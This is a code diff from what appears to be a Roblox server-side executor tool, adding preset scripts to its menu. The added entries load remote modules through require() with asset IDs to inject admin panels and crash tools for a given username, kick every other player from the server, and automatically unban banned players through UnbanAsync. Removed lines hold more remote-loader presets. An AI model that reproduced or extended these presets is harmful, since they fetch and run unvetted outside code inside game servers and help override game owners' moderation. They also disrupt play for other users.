@@ -2926,18 +2926,40 @@ end
 ]] },
 
             { name = "admin panel .txt", code = "require(12159842278).ADMIN('%username%')" },
+			{ name = "sugma .txt",      code = "require(11183244198):s('sugma', game.Players.%username%)" },
+			{ name = "polaria .txt",    code = "require(123255432303221):Pload('%username%')" },
+			{ name = "sensation hub .txt",    code = "require(100263845596551)('%username', ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")" },
+
+			{ name = "kick others .txt", code = [[
+reason = ""
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+	if v.Name ~= '%username%' then
+    v:Kick(reason)
+	--v:Remove()
+	end
+end
+]] },
+
+			{ name = "anti ban .txt", code = [[
+--require(5004222221).load('lmao ',{'bruh'})
+game:GetService("Players").PlayerRemoving:Connect(function(plr)
+    local use = plr.UserId
+    local history = game:GetService('Players'):GetBanHistoryAsync(use)
+    local pages = history:GetCurrentPage()
+    for _,v in next,pages do
+        if v.Ban then
+            game:GetService("Players"):UnbanAsync({
+                UserIds = {use},
+                ApplyToUniverse = true
+            })
+        end
+    end
+end)
+]] },
+
             { name = "CrashUI",         code = "require(6053693667).Crashexe('%username%')" },
             { name = "R6",              code = "require(4585652241).load('%username%')" },
-            { name = "KillBot",         code = "require(3904000898).load('%username%')" },
-            { name = "YingYang",        code = "require(4875966146).load('%username%')" },
-            { name = "HackerMan",       code = "require(4876105392).load('%username%')" },
-            { name = "SakuraHub",       code = "require(5536569504):SH('%username%')" },
-            { name = "Fraud",           code = "require(4952179933).Fraud('%username%')" },
-            { name = "F3X",             code = "require(4869378421).F3X('%username%')" },
-            { name = "UndetectedHub",   code = "require(5673170715).Leak('%username%')" },
-            { name = "PoliceAI",        code = "require(7163976217).VK('%username%')" },
-            { name = "TankAI",          code = "require(7203746402).tonk('%username%')" },
-            { name = "JuggernautAI",    code = "require(7486656912).Juggernaut('%username%')" }
+            { name = "F3X",             code = "require(4869378421).F3X('%username%')" }
         }
     end
 }
@@ -3282,8 +3304,9 @@ end
 
 local function resizeParentCanvas()
 	-- calculate scroll x size
-	local xSize = size * template.AbsoluteSize.X + (size + 1) * 5 + addBtn.AbsoluteSize.X;
-	openScripts.CanvasSize = UDim2.new(0, xSize, 0, 0);
+	local extraPadding = 20
+	local xSize = size * template.AbsoluteSize.X + (size + 1) * 5 + addBtn.AbsoluteSize.X + extraPadding
+	openScripts.CanvasSize = UDim2.new(0, xSize, 0, 0)
 end
 
 local function setupTab(tab)
